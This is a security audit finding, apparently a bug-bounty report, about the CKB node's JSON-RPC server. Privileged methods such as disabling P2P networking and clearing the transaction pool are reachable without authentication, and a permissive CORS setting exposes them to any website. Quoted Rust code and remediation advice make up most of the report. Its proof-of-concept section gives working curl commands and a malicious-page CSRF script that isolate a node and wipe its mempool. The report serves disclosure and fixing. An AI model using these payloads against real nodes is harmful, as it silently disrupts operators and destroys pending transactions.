### Title
Unauthenticated RPC Callers Can Disable P2P Networking and Wipe the Transaction Pool — (`rpc/src/server.rs`, `rpc/src/module/net.rs`, `rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC server has no authentication or authorization layer. Privileged, state-mutating operations — `set_network_active`, `clear_tx_pool`, `clear_tx_verify_queue`, `clear_banned_addresses`, and `set_ban` — are exposed to any caller who can reach the RPC port with zero credential checks. Combined with `CorsLayer::permissive()` on the HTTP server, a malicious web page can silently invoke these operations against any locally running CKB node whose owner visits the page, isolating the node from the P2P network or wiping its mempool.

---

### Finding Description

**Root cause — no authentication middleware in the RPC server**

`rpc/src/server.rs` builds the axum router and attaches no authentication layer of any kind:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())          // ← allows ALL origins
    .layer(TimeoutLayer::with_status_code(…))
    .layer(Extension(stream_config));
``` [1](#0-0) 

The request handler `handle_jsonrpc` dispatches directly to `io.handle_call(call, T::default())` with no token, session, or IP check: [2](#0-1) 

**Privileged operations with no per-method guard**

`set_network_active` — disables or re-enables all P2P network activity: [3](#0-2) 

`clear_tx_pool` — atomically removes every transaction from the mempool: [4](#0-3) 

`clear_tx_verify_queue` — removes all transactions from the verification queue: [5](#0-4) 

`clear_banned_addresses` — erases all IP bans, re-exposing the node to previously banned peers: [6](#0-5) 

None of these functions check any credential, role, or token before executing. The `ServiceBuilder` mounts them unconditionally when the module is enabled: [7](#0-6) 

**CORS-enabled cross-origin attack path**

`CorsLayer::permissive()` instructs the browser to honour preflight responses for all origins. Because `Content-Type: application/json` is a non-simple content type, the browser sends a preflight OPTIONS request; `CorsLayer::permissive()` approves it, and the browser then sends the actual POST. A malicious web page can therefore call any RPC method against `http://127.0.0.1:8114` without the user's knowledge. [8](#0-7) 

---

### Impact Explanation

| Operation | Effect |
|---|---|
| `set_network_active(false)` | Node stops sending and receiving all P2P messages — blocks and transactions are neither propagated nor received. The node is silently partitioned from the network. |
| `clear_tx_pool()` | All pending transactions are discarded. A miner's fee revenue is zeroed; a user's unconfirmed transactions disappear and must be rebroadcast. |
| `clear_tx_verify_queue()` | Transactions awaiting script verification are dropped, causing silent loss of submitted transactions. |
| `clear_banned_addresses()` | All IP bans are lifted, allowing previously banned malicious peers to reconnect immediately. |
| `set_ban("…", "delete", …)` | Selectively lifts a specific ban, re-admitting a known-bad peer. |

The most severe combination: an attacker calls `set_network_active(false)` to isolate the node, then `clear_tx_pool()` to wipe the mempool. The node operator sees no error — the node appears healthy but is completely cut off from the network and has lost all pending transactions.

---

### Likelihood Explanation

**Direct RPC caller (explicitly in scope):** Any process or user that can reach the RPC port — which is `127.0.0.1:8114` by default but is routinely exposed on `0.0.0.0` by node operators running dApps or block explorers — can call these methods with a single `curl` or HTTP POST. No credentials are required.

**Web-based CSRF (no privileged access needed):** Because `CorsLayer::permissive()` is unconditional, any web page the node operator visits can silently POST to `http://127.0.0.1:8114`. The attacker needs only to serve a page with a `fetch()` call — no leaked keys, no local access, no social engineering beyond getting the victim to visit a URL.

---

### Recommendation

1. **Add an authentication layer to the RPC server.** Implement HTTP Bearer token or HTTP Basic Auth middleware in `rpc/src/server.rs` that rejects unauthenticated requests before they reach any handler. The miner client already has `parse_authorization` support on the client side; the server side has no equivalent. [9](#0-8) 

2. **Replace `CorsLayer::permissive()` with a restrictive CORS policy.** Allow only explicitly configured origins, or disallow cross-origin requests entirely for the HTTP endpoint. [8](#0-7) 

3. **Separate privileged methods into a distinct, non-default module** (analogous to how `IntegrationTest` is gated) so that operators who do not need `set_network_active` or `clear_tx_pool` cannot accidentally expose them. [10](#0-9) 

---

### Proof of Concept

**Direct call (any process that can reach the port):**

```bash
# Disable all P2P networking
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"set_network_active","params":[false]}'

# Wipe the entire mempool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
```

Both return `{"result":null}` with no authentication challenge.

**Web-based CSRF (malicious page, no local access required):**

```html
<script>
// Runs silently when victim visits the page.
// CorsLayer::permissive() approves the preflight; the POST succeeds.
fetch('http://127.0.0.1:8114', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({id:1,jsonrpc:'2.0',method:'set_network_active',params:[false]})
});
fetch('http://127.0.0.1:8114', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({id:2,jsonrpc:'2.0',method:'clear_tx_pool',params:[]})
});
</script>
```

The node's P2P layer is disabled and its mempool is cleared without the operator performing any action beyond visiting the page.

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-258)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;
```

**File:** rpc/src/module/net.rs (L686-689)
```rust
    fn clear_banned_addresses(&self) -> Result<()> {
        self.network_controller.clear_banned_addrs();
        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L772-775)
```rust
    fn set_network_active(&self, state: bool) -> Result<()> {
        self.network_controller.set_active(state);
        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-701)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/service_builder.rs (L36-46)
```rust
macro_rules! set_rpc_module_methods {
    ($self:ident, $name:expr, $check:ident, $add_methods:ident, $methods:expr) => {{
        let mut meta_io = MetaIoHandler::default();
        $add_methods(&mut meta_io, $methods);
        if $self.config.$check() {
            $self.add_methods(meta_io);
        } else {
            $self.update_disabled_methods($name, meta_io);
        }
        $self
    }};
```

**File:** rpc/src/service_builder.rs (L102-115)
```rust
    /// Mounts methods from module Net if it is enabled in the config.
    pub fn enable_net(
        mut self,
        network_controller: NetworkController,
        sync_shared: Arc<SyncShared>,
        chain_controller: Arc<ChainController>,
    ) -> Self {
        let methods = NetRpcImpl {
            network_controller,
            sync_shared,
            chain_controller,
        };
        set_rpc_module_methods!(self, "Net", net_enable, add_net_rpc_methods, methods)
    }
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
